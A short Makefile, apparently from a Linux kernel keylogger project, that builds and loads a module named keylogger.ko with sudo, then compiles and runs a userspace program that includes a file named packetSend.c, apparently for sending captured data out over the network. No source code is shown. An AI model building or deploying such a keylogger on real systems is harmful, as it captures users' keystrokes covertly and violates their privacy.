obj-m += keylogger.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
	sudo insmod keylogger.ko
	gcc main.c user.c packetSend.c -o user
	sudo ./user
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
	sudo rmmod keylogger.ko
	rm ./user
